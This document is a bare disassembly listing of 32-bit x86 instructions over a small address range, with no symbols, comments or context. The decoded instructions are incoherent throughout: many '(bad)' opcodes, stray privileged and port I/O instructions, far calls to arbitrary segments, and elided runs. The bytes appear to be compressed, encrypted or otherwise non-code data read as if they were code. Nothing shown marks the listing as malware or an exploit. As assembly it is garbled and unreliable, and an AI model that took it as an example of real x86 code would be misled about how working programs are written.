  41a0cf:	xor    al,0x4
  41a0d1:	push   cs
  41a0d2:	ds push ss
  41a0d4:	xor    al,0xa2
  41a0d6:	cld    
  41a0d7:	cmp    eax,0xc6340517
  41a0dc:	aad    0x8c
  41a0de:	(bad)  
  41a0df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e0:	fnstenv [esi]
  41a0e2:	call   0xc001:0xafc24ab7
  41a0e9:	jns    0x41a0b4
  41a0eb:	push   ss
  41a0ec:	mov    edi,0x5773906b
  41a0f1:	out    0x42,al
  41a0f3:	and    al,0x97
  41a0f5:	add    al,0x25
  41a0f7:	ss enter 0x6d89,0xe0
  41a0fc:	sbb    ah,BYTE PTR [eax]
  41a0fe:	setne  cl
  41a101:	and    ah,BYTE PTR [edx]
  41a103:	sar    BYTE PTR [eax+0x2aabb927],cl
  41a109:	inc    ecx
  41a10a:	loop   0x41a0d4
  41a10c:	test   eax,0xeceb71f3
  41a111:	pop    ebp
  41a112:	leave  
  41a113:	mov    esi,0x71c2c846
  41a118:	call   0x503c:0xcf8d721c
  41a11f:	push   eax
  41a120:	cmp    al,0xed
  41a122:	(bad)  [ebp-0x56]
  41a125:	pop    esp
  41a126:	rol    esp,1
  41a128:	mov    ebp,0xbbe34ed0
  41a12d:	shl    BYTE PTR [ebx],cl
  41a12f:	(bad)  
  41a130:	cmp    DWORD PTR [esi],edx
  41a132:	pop    edi
  41a133:	enter  0x947d,0xb8
  41a137:	mov    BYTE PTR [edi+0x3c],cl
  41a13a:	cmp    eax,0x56a74018
  41a13f:	loope  0x41a16e
  41a141:	fs pop ss
  41a143:	mov    edi,0xe760e921
  41a148:	iret   
  41a149:	ror    BYTE PTR [ebx+0x15],0x8d
  41a14d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a14e:	push   edi
  41a14f:	rol    BYTE PTR cs:[edi-0x79],0xb7
  41a154:	mov    al,0xd7
  41a156:	cmp    BYTE PTR [esi-0x4],al
  41a159:	push   ecx
  41a15a:	daa    
  41a15b:	shr    DWORD PTR [ecx+0x2b918a61],1
  41a161:	fisub  DWORD PTR [edi-0x45]
  41a164:	lock jbe 0x41a198
  41a167:	jno    0x41a144
  41a169:	jge    0x41a151
  41a16b:	mov    eax,ds:0xf1604d9e
  41a170:	ret    0xa009
  41a173:	or     DWORD PTR [ebx+esi*4-0x17],0xffffff96
  41a178:	or     esp,DWORD PTR ss:[ecx-0xa]
  41a17c:	sbb    dl,0xcb
  41a17f:	push   0x41d20ebb
  41a184:	xor    DWORD PTR [ebx+0x1c7a4596],edx
  41a18a:	add    BYTE PTR [esi-0x75],bl
  41a18d:	pop    eax
  41a18e:	mov    fs,WORD PTR [ecx+0x697aba2c]
  41a194:	adc    ah,BYTE PTR [ebp-0x7e7417f3]
  41a19a:	sar    BYTE PTR [esi-0x1],0xcc
  41a19e:	mov    dl,0x40
  41a1a0:	xor    ebx,DWORD PTR [ecx-0x29131be9]
  41a1a6:	dec    edi
  41a1a7:	arpl   WORD PTR [esp+ebp*2+0x61],cx
  41a1ab:	mov    esi,0x4cfd316b
  41a1b0:	cmc    
  41a1b1:	xchg   edx,eax
  41a1b2:	push   cs
  41a1b3:	inc    esp
  41a1b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1b5:	cmp    al,0x4d
  41a1b7:	pop    gs
  41a1b9:	inc    eax
  41a1ba:	xor    al,0x77
  41a1bc:	icebp  
  41a1bd:	iret   
  41a1be:	leave  
  41a1bf:	aas    
  41a1c0:	lds    edx,FWORD PTR [eax+0x0]
	...
  41a232:	add    BYTE PTR [eax],al
  41a234:	mov    al,ds:0xff33bae7
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	mul    BYTE PTR [edi+ecx*1]
  41a242:	mov    bl,BYTE PTR [esp+ebx*2+0x1b]
  41a246:	add    DWORD PTR [eax],eax
  41a248:	test   BYTE PTR [eax],0x0
  41a24b:	add    al,ch
  41a24d:	push   ds
  41a24e:	aam    0x1f
  41a250:	in     eax,0x5c
  41a252:	push   edi
  41a253:	xor    cl,BYTE PTR [ecx+ebx*8-0x57177bc1]
  41a25a:	pushf  
  41a25b:	repnz mov ecx,0x8f24a1d
  41a261:	cmp    ebx,DWORD PTR [edi-0x86bba99]
  41a267:	xor    DWORD PTR [esi],edx
  41a269:	adc    eax,0x627610e7
  41a26e:	pusha  
  41a26f:	sbb    esp,DWORD PTR [edx+0x7d1512f5]
  41a275:	mov    edx,0x899ad72b
  41a27a:	xchg   ecx,eax
  41a27b:	ss nop
  41a27d:	inc    ebx
  41a27e:	sar    ch,cl
  41a280:	cs popf 
  41a282:	sub    eax,0xd5fb933c
  41a287:	pop    edi
  41a288:	leave  
  41a289:	bound  esi,QWORD PTR [edx+0x7fc9f057]
  41a28f:	arpl   WORD PTR [ebp-0x4b30162e],cx
  41a295:	(bad)
  41a299:	in     al,0x13
  41a29b:	fcom   DWORD PTR [esi-0x2879cc4f]
  41a2a1:	pop    ss
  41a2a2:	jb     0x41a263
  41a2a4:	out    dx,al
  41a2a5:	mov    DWORD PTR [ebx],ecx
  41a2a7:	push   ecx
  41a2a8:	inc    ebp
  41a2a9:	outs   dx,BYTE PTR ds:[esi]
  41a2aa:	inc    edi
  41a2ab:	shr    BYTE PTR [esi],0x65
  41a2ae:	dec    esp
  41a2af:	or     ebx,DWORD PTR [ebx-0xb]
  41a2b2:	or     eax,0x70b4f93a
  41a2b7:	aam    0x9b
  41a2b9:	jae    0x41a287
  41a2bb:	mov    esp,DWORD PTR [ecx]
  41a2bd:	mov    ebp,0x4412fb69
  41a2c2:	add    eax,0x318aa9b7
  41a2c7:	cmp    eax,0xe0cfe00a
  41a2cc:	(bad)  
  41a2ce:	daa    
  41a2cf:	sbb    eax,0x9eb43350
  41a2d4:	jecxz  0x41a338
  41a2d6:	adc    BYTE PTR [esi+0x3e],dh
  41a2d9:	das    
  41a2da:	add    eax,0x818ec5f4
  41a2df:	shr    DWORD PTR [edi],0x9c
  41a2e2:	cmp    edx,eax
  41a2e4:	mov    ebp,0xa93b0902
  41a2e9:	fdivrp st(4),st
  41a2eb:	push   esi
  41a2ec:	das    
  41a2ed:	pushf  
  41a2ee:	bound  ebx,QWORD PTR [eax+eax*8-0x21]
  41a2f2:	adc    DWORD PTR [ebx+ebx*8-0x58],edi
  41a2f6:	stos   BYTE PTR es:[edi],al
  41a2f7:	ror    BYTE PTR [ecx-0x7714aa33],1
  41a2fd:	add    DWORD PTR [edi],ebp
  41a2ff:	jae    0x41a30b
  41a301:	inc    eax
  41a302:	mov    bh,0x50
  41a304:	and    DWORD PTR [ebp-0x49828635],eax
  41a30a:	jle    0x41a2de
  41a30c:	imul   eax,DWORD PTR [ecx-0x60860d86],0x75
  41a313:	push   edx
  41a314:	mov    eax,ds:0x462e1c76
  41a319:	icebp  
  41a31a:	dec    eax
  41a31b:	rcr    BYTE PTR [eax+0x41181461],1
  41a321:	dec    esp
  41a322:	adc    dl,0xa
  41a325:	xchg   ecx,eax
  41a326:	test   eax,0xb8a016d7
  41a32b:	les    ebp,FWORD PTR [esi-0xdb49f29]
  41a331:	ds inc esp
  41a333:	push   ds
  41a334:	aaa    
  41a335:	(bad)  
  41a337:	loop   0x41a35c
  41a339:	xchg   BYTE PTR [edx],bl
  41a33b:	aad    0x2a
  41a33d:	and    eax,DWORD PTR [eax+ebx*4-0x7f]
  41a341:	sbb    al,BYTE PTR [eax]
	...
  41a3b3:	add    BYTE PTR ds:0xed3a6998,bh
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3c1:	jno    0x41a3e8
  41a3c3:	pop    esp
  41a3c4:	push   edx
  41a3c5:	sbb    al,0x1
  41a3c7:	add    dh,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ecx+0x78],ah
  41a3ce:	jnp    0x41a3c4
  41a3d0:	push   esp
  41a3d1:	sar    dl,0x7b
  41a3d4:	sub    DWORD PTR [esi],ecx
  41a3d6:	rol    DWORD PTR [ebp-0x70],cl
  41a3d9:	sbb    BYTE PTR [eax],0x49
  41a3dc:	iret   
  41a3dd:	pusha  
  41a3de:	mov    eax,0x71d61a09
  41a3e3:	xor    ebp,DWORD PTR ss:[ebp+0x6282a19b]
  41a3ea:	inc    eax
  41a3eb:	or     BYTE PTR [esi],dh
  41a3ed:	lahf   
  41a3ee:	leave  
  41a3ef:	sti    
  41a3f0:	sbb    eax,0xccbf9e9d
  41a3f5:	jne    0x41a44a
  41a3f7:	mov    ebx,ebx
  41a3f9:	cs or  eax,0xbd00306f
  41a3ff:	fisub  DWORD PTR [edx-0x5600c166]
  41a405:	cmc    
  41a406:	jl     0x41a41b
  41a408:	lds    esp,FWORD PTR [edx]
  41a40a:	xor    ah,ch
  41a40c:	cwde   
  41a40d:	addr16 jnp 0x41a3ca
  41a410:	sbb    DWORD PTR [ecx+0x23],0xffffffe1
  41a414:	inc    ebp
  41a415:	mov    esp,0xaceb8e7a
  41a41a:	add    al,0x3e
  41a41c:	jns    0x41a3c0
  41a41e:	rol    esp,0x5a
  41a421:	jno    0x41a3c6
  41a423:	jg     0x41a3e3
  41a425:	aad    0xd0
  41a427:	adc    al,0x72
  41a429:	sbb    DWORD PTR [esi+0x3ed90e12],ecx
  41a42f:	adc    eax,0xd0fc5150
  41a434:	ret    0x2deb
  41a437:	stos   DWORD PTR es:[edi],eax
  41a438:	cmp    eax,0xd66c2077
  41a43d:	xchg   edx,eax
  41a43e:	push   0xbc64c942
  41a443:	stc    
  41a444:	inc    ebp
  41a445:	sub    cl,BYTE PTR [esi+0x40]
  41a448:	lock sbb eax,0x101a8962
  41a44e:	ins    DWORD PTR es:[edi],dx
  41a44f:	pop    ss
  41a450:	mov    bh,0x79
  41a452:	stc    
  41a453:	cs stos BYTE PTR es:[edi],al
  41a455:	mov    al,ds:0xe08d3baa
  41a45a:	mov    dh,0x7d
  41a45c:	stos   BYTE PTR es:[edi],al
  41a45d:	mov    DWORD PTR [eax+0x52],eax
  41a460:	and    esi,DWORD PTR ds:0x1c29e628
  41a466:	xchg   ebx,eax
  41a467:	stc    
  41a468:	adc    BYTE PTR [edi],bh
  41a46a:	rcr    ebp,cl
  41a46c:	sti    
  41a46d:	push   cs
  41a46e:	sbb    al,0x91
  41a470:	mov    ebp,0xf513ec6c
  41a475:	mov    ah,0x64
  41a477:	cli    
  41a478:	scas   al,BYTE PTR es:[edi]
  41a479:	fs call 0x42c9:0x9a121780
  41a481:	shl    BYTE PTR [eax+eiz*4],1
  41a484:	fldenv [esi]
  41a486:	fmulp  st(2),st
  41a488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a489:	add    BYTE PTR [ebp-0x184b3a56],ah
  41a48f:	popa   
  41a490:	mov    dh,0x63
  41a492:	popf   
  41a493:	fsub   st(4),st
  41a495:	add    BYTE PTR [edi-0x32],al
  41a498:	fstp   QWORD PTR [esi]
  41a49a:	enter  0xc8a9,0x4a
  41a49e:	mov    eax,ds:0x8edde00
  41a4a3:	outs   dx,DWORD PTR ds:[esi]
  41a4a4:	clc    
  41a4a5:	xor    bl,dh
  41a4a7:	shr    BYTE PTR [eax+0x10f05eea],0xff
  41a4ae:	inc    edx
  41a4af:	les    ebx,FWORD PTR [edi-0x72]
  41a4b2:	sbb    bh,BYTE PTR [edi-0x112fd3cf]
  41a4b8:	dec    ebp
  41a4b9:	je     0x41a484
  41a4bb:	or     eax,0xfdeb82fb
  41a4c0:	add    al,0xdb
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax-0x36161f56]
  41a541:	inc    esp
  41a542:	(bad)  
  41a543:	cld    
  41a544:	dec    eax
  41a545:	sbb    eax,0xf60001
  41a54a:	add    BYTE PTR [eax],al
  41a54c:	dec    ebp
  41a54d:	push   0xf5c2e413
  41a552:	jne    0x41a58b
  41a554:	push   esp
  41a555:	test   al,0x6b
  41a557:	(bad)  
  41a558:	fdivr  DWORD PTR [ecx+eiz*1-0x53]
  41a55c:	shr    esp,0x5d
  41a55f:	in     eax,dx
  41a560:	xchg   ebp,eax
  41a561:	(bad)  
  41a562:	scas   al,BYTE PTR es:[edi]
  41a563:	sub    eax,0xb60b7b5f
  41a568:	sahf   
  41a569:	xor    BYTE PTR [edi-0x72035a9d],cl
  41a56f:	jge    0x41a5d2
  41a571:	cpuid  
  41a573:	(bad)  
  41a575:	in     al,0xdf
  41a577:	bnd ja 0x41a5e5
  41a57a:	xor    al,0xd
  41a57c:	sub    DWORD PTR [esi],esi
  41a57e:	retf   0xc27a
  41a581:	mov    ah,0x33
  41a583:	jne    0x41a57c
  41a585:	adc    al,0xb7
  41a587:	sar    BYTE PTR [edi-0x6c],cl
  41a58a:	fidivr WORD PTR [edi+0x26]
  41a58d:	hlt    
  41a58e:	xor    ebp,DWORD PTR [edi+ebx*1]
  41a591:	push   edi
  41a592:	mov    bh,0xe8
  41a594:	cmp    BYTE PTR [esi+0x55],dl
  41a597:	cld    
  41a598:	xor    ch,bh
  41a59a:	fisubr WORD PTR [edx+0x6a]
  41a59d:	(bad)  
  41a59f:	call   0x90c4:0x89fe1fa0
  41a5a6:	xor    BYTE PTR [eax],bh
  41a5a8:	pop    esp
  41a5a9:	cmp    esp,DWORD PTR [ebx-0xb]
  41a5ac:	dec    ebx
  41a5ad:	and    DWORD PTR [ebp+0x65ccf0d7],eax
  41a5b3:	mov    WORD PTR [ebx+ebp*4-0x6209ec8e],fs
  41a5ba:	iret   
  41a5bb:	in     al,0xb5
  41a5bd:	sub    edx,DWORD PTR [ebx+0x58c6f80a]
  41a5c3:	hlt    
  41a5c4:	jmp    0xe7fece95
  41a5c9:	push   ecx
  41a5ca:	arpl   WORD PTR [eax],cx
  41a5cc:	mov    edx,0x37a01abc
  41a5d1:	push   edi
  41a5d2:	pop    DWORD PTR [edx+0x23b07c22]
  41a5d8:	xor    eax,0x9488bbb3
  41a5dd:	dec    ecx
  41a5de:	jge    0x41a564
  41a5e0:	nop
  41a5e1:	mov    ds:0xa6c42d34,al
  41a5e6:	and    bh,BYTE PTR [eax-0x67]
  41a5e9:	mov    ebx,ebp
  41a5eb:	cmp    ebx,DWORD PTR [ebp-0x69ba4af6]
  41a5f1:	mov    cl,0xf4
  41a5f3:	(bad)  
  41a5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f5:	push   esi
  41a5f6:	push   edx
  41a5f7:	je     0x41a5ad
  41a5f9:	xor    bh,BYTE PTR [eax-0x5b9becf]
  41a5ff:	mov    edx,0x95fcc0c6
  41a604:	adc    ch,BYTE PTR [edx+0x163f6ff3]
  41a60a:	or     edx,ecx
  41a60c:	leave  
  41a60d:	adc    esi,DWORD PTR [edx+esi*1-0x18]
  41a611:	pop    edx
  41a612:	inc    esp
  41a613:	test   BYTE PTR [ebp+0x58425337],0x85
  41a61a:	div    DWORD PTR [eax-0x4e]
  41a61d:	cmp    eax,0x81d37143
  41a622:	mov    al,0xcd
  41a624:	pushw  ds
  41a626:	test   DWORD PTR [ebp-0x5f],ebp
  41a629:	ja     0x41a645
  41a62b:	mov    ch,0x17
  41a62d:	sbb    edi,DWORD PTR [edi-0x166dd6e2]
  41a633:	lds    esi,FWORD PTR fs:[eax-0xe]
  41a637:	jmp    0x94f9:0x345e4bf2
  41a63e:	fcmovne st,st(6)
  41a640:	sub    DWORD PTR [ebp+0x0],esi
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0xb0
  41a6c1:	mov    esi,0x1e3e0d49
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    BYTE PTR [esi],ah
  41a6cd:	sahf   
  41a6ce:	mov    dl,0x24
  41a6d0:	sub    ah,0xb5
  41a6d3:	leave  
  41a6d4:	sbb    al,0x3b
  41a6d6:	dec    esi
  41a6d7:	push   0x37
  41a6d9:	popa   
  41a6da:	push   esp
  41a6db:	dec    ecx
  41a6dc:	test   al,0xa2
  41a6de:	stos   DWORD PTR es:[edi],eax
  41a6df:	in     eax,dx
  41a6e0:	and    al,0x44
  41a6e2:	push   es
  41a6e3:	jnp    0x41a6ae
  41a6e5:	inc    esp
  41a6e6:	in     eax,dx
  41a6e7:	push   ss
  41a6e8:	dec    edi
  41a6e9:	cmp    esp,ecx
  41a6eb:	jg     0x41a721
  41a6ed:	xor    dh,BYTE PTR [edx]
  41a6ef:	push   edi
  41a6f0:	out    dx,al
  41a6f1:	dec    eax
  41a6f2:	mov    edi,0xc44a02
  41a6f7:	dec    edx
  41a6f8:	fsubr  QWORD PTR [esi+eiz*4-0x1a]
  41a6fc:	jge    0x41a708
  41a6fe:	in     eax,0xcd
  41a700:	mov    esp,0x7356d0d9
  41a705:	cdq    
  41a706:	repnz leave 
  41a708:	je     0x41a6b2
  41a70a:	cmc    
  41a70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a70c:	fnstcw WORD PTR [eax+esi*4-0x38]
  41a710:	pop    esi
  41a711:	mov    ah,0xc1
  41a713:	adc    DWORD PTR [eax+0x42],0xe5ca6c27
  41a71a:	icebp  
  41a71b:	retf   0xf549
  41a71e:	sbb    BYTE PTR [edi+0x62f1a9c],dh
  41a724:	or     cl,dl
  41a726:	xchg   ebx,eax
  41a727:	push   ecx
  41a728:	sbb    eax,0xed533370
  41a72d:	les    esi,FWORD PTR [esi-0x7c67ac71]
  41a733:	mov    ah,0xce
  41a735:	mov    edi,0x81968ab0
  41a73a:	and    DWORD PTR [ebp-0x79],0x60ca13c
  41a741:	sub    eax,0x25dc87ef
  41a746:	adc    dh,BYTE PTR [edx+eiz*8+0x47fae81d]
  41a74d:	call   0xdf3a:0x2f5ff092
  41a754:	in     eax,dx
  41a755:	or     al,0xc1
  41a757:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a759:	dec    edx
  41a75a:	cmp    DWORD PTR [edx+0x66e1391b],eax
  41a760:	and    cl,cl
  41a762:	pavgw  mm4,QWORD PTR [ecx]
  41a765:	addr16 dec eax
  41a767:	jecxz  0x41a787
  41a769:	scas   eax,DWORD PTR es:[edi]
  41a76a:	arpl   WORD PTR [eax],bx
  41a76c:	(bad)  
  41a76d:	push   0xffffffcc
  41a76f:	aas    
  41a770:	outs   dx,DWORD PTR ds:[esi]
  41a771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a772:	add    ebp,ebp
  41a774:	cmp    bh,BYTE PTR [edi]
  41a776:	and    ebp,esp
  41a778:	shl    eax,0xad
  41a77b:	je     0x41a75c
  41a77d:	ficom  DWORD PTR [ebx+edx*1-0x29]
  41a781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a782:	jp     0x41a7ae
  41a784:	dec    edi
  41a785:	sbb    cl,cl
  41a787:	scas   eax,DWORD PTR es:[edi]
  41a788:	xor    dh,BYTE PTR [ebp+0x396cd0e2]
  41a78e:	out    dx,eax
  41a78f:	mov    ecx,0xeef4c743
  41a794:	xor    al,0x5c
  41a796:	add    eax,0xf9447630
  41a79b:	test   eax,0xfb9ff9ea
  41a7a0:	ins    DWORD PTR es:[edi],dx
  41a7a1:	int3   
  41a7a2:	out    dx,al
  41a7a3:	rcl    DWORD PTR [ecx-0x19],1
  41a7a6:	fstp   st(6)
  41a7a8:	mov    WORD PTR [eax+esi*8+0xb],cs
  41a7ac:	fstp   TBYTE PTR [ecx]
  41a7ae:	inc    BYTE PTR [edx+eax*1-0x68]
  41a7b2:	sahf   
  41a7b3:	push   ebx
  41a7b4:	pop    esp
  41a7b5:	xchg   esi,eax
  41a7b6:	int3   
  41a7b7:	pop    esi
  41a7b8:	add    dl,cl
  41a7ba:	push   es
  41a7bb:	push   ebp
  41a7bc:	pop    edi
  41a7bd:	add    edi,esi
  41a7bf:	xor    eax,0x3576
	...
  41a834:	sbb    BYTE PTR [ecx],0x47
  41a837:	loope  0x41a818
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a7df
  41a841:	ja     0x41a8ad
  41a843:	imul   esi,DWORD PTR [edi+ebx*1],0x1
  41a847:	add    dh,dh
  41a849:	add    BYTE PTR [eax],al
  41a84b:	add    BYTE PTR [ebx],ch
  41a84d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a84e:	sub    ah,dh
  41a850:	ds add ah,ah
  41a853:	and    al,0xad
  41a855:	mov    eax,0xc21f6e42
  41a85a:	push   ds
  41a85b:	repnz (bad) 
  41a85d:	loop   0x41a884
  41a85f:	inc    esi
  41a860:	clc    
  41a861:	adc    dh,dl
  41a863:	outs   dx,DWORD PTR ds:[esi]
  41a864:	pop    es
  41a865:	pop    ebp
  41a866:	pop    esp
  41a867:	das    
  41a868:	mov    bh,0xfb
  41a86a:	inc    edi
  41a86b:	dec    eax
  41a86c:	xor    BYTE PTR [ebp-0x4460b08d],bl
  41a872:	repnz and DWORD PTR [ebp+ecx*2+0x32d15461],edx
  41a87a:	jne    0x41a8d3
  41a87c:	push   esp
  41a87d:	jl     0x41a87b
  41a87f:	mov    ah,0x0
  41a881:	xchg   ecx,eax
  41a882:	ins    DWORD PTR es:[edi],dx
  41a883:	out    0x2d,al
  41a885:	jne    0x41a818
  41a887:	push   eax
  41a888:	xor    ch,BYTE PTR [eax+0x2500b4be]
  41a88e:	mov    esp,0x50dd8ac3
  41a893:	push   ds
  41a894:	xor    BYTE PTR [ebx+0x41c70a43],0x6d
  41a89b:	retf   
  41a89c:	or     al,0x62
  41a89e:	sbb    edi,esi
  41a8a0:	and    eax,0xff7e7f05
  41a8a5:	into   
  41a8a6:	fidiv  WORD PTR [eax-0x596d6136]
  41a8ac:	adc    al,0xf
  41a8ae:	mov    ch,0x98
  41a8b0:	in     eax,0xe6
  41a8b2:	mov    DWORD PTR [esi+ebp*4-0x4b],esi
  41a8b6:	rcl    cl,cl
  41a8b8:	xor    edi,DWORD PTR [ebx]
  41a8ba:	les    esi,FWORD PTR ds:0x9b319163
  41a8c0:	jns    0x41a8e4
  41a8c2:	std    
  41a8c3:	lea    ebx,cs:[edx+0xd]
  41a8c7:	xor    eax,0x6f5c2152
  41a8cc:	mul    DWORD PTR [edx-0x60]
  41a8cf:	dec    esp
  41a8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8d1:	or     bl,BYTE PTR [ebx*8-0x72dae09f]
  41a8d8:	fist   DWORD PTR [ebp-0x638bef39]
  41a8de:	jno    0x41a8d1
  41a8e0:	or     al,0xb0
  41a8e2:	adc    BYTE PTR [ebp-0x7a],0x73
  41a8e6:	push   edx
  41a8e7:	mov    esp,ss
  41a8e9:	imul   ebp,ebx,0xffffffea
  41a8ec:	ins    DWORD PTR es:[edi],dx
  41a8ed:	add    dh,dl
  41a8ef:	ins    BYTE PTR es:[edi],dx
  41a8f0:	add    bh,BYTE PTR [esp+edi*2]
  41a8f3:	jmp    0xa501:0x3f3cb183
  41a8fa:	daa    
  41a8fb:	loope  0x41a906
  41a8fd:	push   esi
  41a8fe:	fistp  DWORD PTR [ebp+0x78]
  41a901:	outs   dx,DWORD PTR ds:[esi]
  41a902:	mov    eax,ds:0xa5c8e1d5
  41a907:	test   DWORD PTR [edi+0x46],eax
  41a90a:	in     eax,dx
  41a90b:	push   0x401fb0f8
  41a910:	mov    al,ds:0x44880cda
  41a915:	shl    DWORD PTR [ebp-0x9edc82],cl
  41a91b:	popf   
  41a91c:	dec    eax
  41a91d:	ror    BYTE PTR [ecx-0x2ae10e7f],0x6c
  41a924:	inc    esp
  41a925:	call   DWORD PTR [ebp+0x66b905fc]
  41a92b:	mov    gs,WORD PTR [ecx-0x4d]
  41a92e:	mov    bl,0x8d
  41a930:	pop    esp
  41a931:	ja     0x41a904
  41a933:	add    esp,edx
  41a935:	imul   ebx,esi,0xffffff86
  41a938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a939:	add    eax,0x43947aa9
  41a93e:	cmc    
  41a93f:	xor    al,0x7c
  41a941:	xor    BYTE PTR [eax],al
	...
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx+0x39e3df1]
  41a9c1:	adc    ah,BYTE PTR [edi+0x1202a3f]
  41a9c7:	add    dh,dh
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    BYTE PTR [edi],cl
  41a9cd:	lods   al,BYTE PTR ds:[esi]
  41a9ce:	jnp    0x41a9fd
  41a9d0:	adc    esi,DWORD PTR [edi+0x473fa2e0]
  41a9d6:	test   eax,0x48e22bce
  41a9db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9dc:	fnstsw WORD PTR [ecx+0x75]
  41a9df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9e0:	sar    DWORD PTR [edi+0x2904a26f],1
  41a9e6:	push   eax
  41a9e7:	ins    DWORD PTR es:[edi],dx
  41a9e8:	jo     0x41a9e5
  41a9ea:	pop    es
  41a9eb:	add    BYTE PTR [esi],0xde
  41a9ee:	ja     0x41aa23
  41a9f0:	aas    
  41a9f1:	pop    ebp
  41a9f2:	cmc    
  41a9f3:	push   eax
  41a9f4:	int    0x5e
  41a9f6:	ret    0xbcba
  41a9f9:	fwait
  41a9fa:	mov    edi,0x34a4c674
  41a9ff:	inc    ebx
  41aa00:	jp     0x41aa2b
  41aa02:	and    cl,BYTE PTR [ecx-0x54e39ef1]
  41aa08:	or     BYTE PTR ds:[edi],dl
  41aa0b:	jmp    0xe435:0xce87defc
  41aa12:	ins    BYTE PTR es:[edi],dx
  41aa13:	cmp    ch,BYTE PTR [ecx+0x4c]
  41aa16:	or     BYTE PTR [ebx-0x460b7d05],ah
  41aa1c:	out    0x67,eax
  41aa1e:	mov    bl,0x29
  41aa20:	xchg   DWORD PTR [ebp+ebx*8-0x3127d79d],ebp
  41aa27:	pop    ds
  41aa28:	adc    BYTE PTR [ecx],cl
  41aa2a:	stc    
  41aa2b:	aas    
  41aa2c:	mov    dh,0xd1
  41aa2e:	daa    
  41aa2f:	jae    0x41a9e7
  41aa31:	(bad)  
  41aa32:	fucomip st,st(0)
  41aa34:	ficomp WORD PTR [eax-0x2a74ca97]
  41aa3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa3b:	inc    esp
  41aa3c:	outs   dx,DWORD PTR ds:[esi]
  41aa3d:	sub    BYTE PTR [esi],dl
  41aa3f:	xchg   BYTE PTR [ecx+0x1f0c5a01],bh
  41aa45:	mov    edi,DWORD PTR [edi-0x3d6ed9cf]
  41aa4b:	(bad)  
  41aa4c:	loopne 0x41a9da
  41aa4e:	add    BYTE PTR [edx-0x3],dh
  41aa51:	sbb    ecx,DWORD PTR [esi]
  41aa53:	fldcw  WORD PTR [ecx+0x552c2622]
  41aa59:	mov    ebp,0x67430509
  41aa5e:	cwde   
  41aa5f:	lock sbb eax,0x34096077
  41aa65:	or     eax,0xfd8f7cf4
  41aa6a:	add    dl,BYTE PTR [esi-0x28e6ac92]
  41aa70:	fadd   DWORD PTR [eax+0x4f]
  41aa73:	aas    
  41aa74:	ret    0xcea0
  41aa77:	aaa    
  41aa78:	ret    
  41aa79:	mov    bl,0xb1
  41aa7b:	test   BYTE PTR [eax-0x51],cl
  41aa7e:	sub    BYTE PTR [ecx+eax*4+0x24],bl
  41aa82:	setae  BYTE PTR [ebp-0x6ec01f19]
  41aa89:	popa   
  41aa8a:	dec    ebx
  41aa8b:	aad    0xb4
  41aa8d:	mov    cl,0xac
  41aa8f:	rcl    DWORD PTR [esi-0x2db2bf18],1
  41aa95:	pushf  
  41aa96:	ins    DWORD PTR es:[edi],dx
  41aa97:	adc    al,0xfc
  41aa99:	push   0xee0ea460
  41aa9e:	jp     0x41aa33
  41aaa0:	mov    bl,0xe6
  41aaa2:	mov    esp,0x24623a48
  41aaa7:	xchg   edi,eax
  41aaa8:	stos   BYTE PTR es:[edi],al
  41aaa9:	add    eax,0xa60040d
  41aaae:	retf   0x9eb4
  41aab1:	fwait
  41aab2:	and    eax,0xadc116f3
  41aab7:	or     ah,BYTE PTR [eax]
  41aab9:	aam    0xd2
  41aabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aabc:	out    dx,al
  41aabd:	imul   esi,DWORD PTR [edi+0xf306c5],0x0
	...
  41ab34:	dec    edx
  41ab35:	(bad)  
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi+0x3f]
  41ab41:	push   ebx
  41ab42:	xor    DWORD PTR [ebx+0x12120],esp
  41ab48:	test   BYTE PTR [eax],0x0
  41ab4b:	add    BYTE PTR [ecx+0x5c76b60d],dl
  41ab51:	or     DWORD PTR [ebx],0x8b635bbd
  41ab57:	dec    ch
  41ab59:	add    ebp,DWORD PTR [edx+0x4e5d677d]
